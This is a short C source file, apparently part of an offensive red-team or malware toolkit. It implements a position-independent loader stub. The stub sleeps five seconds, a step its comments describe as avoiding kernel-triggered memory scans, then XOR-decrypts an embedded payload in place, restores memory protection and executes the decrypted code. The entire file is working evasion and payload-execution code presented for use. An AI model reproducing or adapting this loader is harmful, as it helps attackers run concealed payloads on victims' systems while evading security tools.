#include <windows.h>
#include "common/tcg.h"

// WinAPI import declarations (resolved by the loader / custom resolver)
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep          ( DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

// Linker-defined section blobs holding the encrypted payload and XOR mask
char _payload_  [ 0 ] __attribute__ ( ( section ( "payload" ) ) );
char _mask_     [ 0 ] __attribute__ ( ( section ( "mask" ) ) );


// Generic resource container used for embedded blobs (payloads, masks, etc.).
typedef struct {
	int   length;   // Size of `value[]` in bytes
	char  value[];  // Flexible array member holding raw bytes
} _RESOURCE;

/*
 * Minimal position-independent stub:
 *  - delays (Caro-Kann principle to avoid kernel-triggered memory scans)
 *  - decrypts the payload in-place using a repeating XOR mask
 *  - restores original memory protection
 *  - transfers execution to the decrypted payload
 */
void go() {

    // Caro-Kann Sleep 5s before starting decryption/execution
	KERNEL32$Sleep ( 5000 );
    
    _RESOURCE * payload = ( _RESOURCE * ) &_payload_;
    _RESOURCE * mask    = ( _RESOURCE * ) &_mask_;
    
    // Make the payload buffer writable for in-place decryption (!VirtualProtect operates at page granularity)
    DWORD orig_protect;
    KERNEL32$VirtualProtect ( payload->value, payload->length, PAGE_READWRITE, &orig_protect );

    // Decrypt payload in-place (XOR with repeating mask)
    for ( int i = 0; i < payload->length; i++ ) {
        payload->value [ i ] = payload->value [ i ] ^ mask->value [ i % mask->length ];
    }

    // Restore the original protection
    DWORD old_protect;
    KERNEL32$VirtualProtect ( payload->value, payload->length, orig_protect, &old_protect );

    // Execute decrypted payload
    ( ( void ( * ) ( ) ) payload->value ) ( );

}
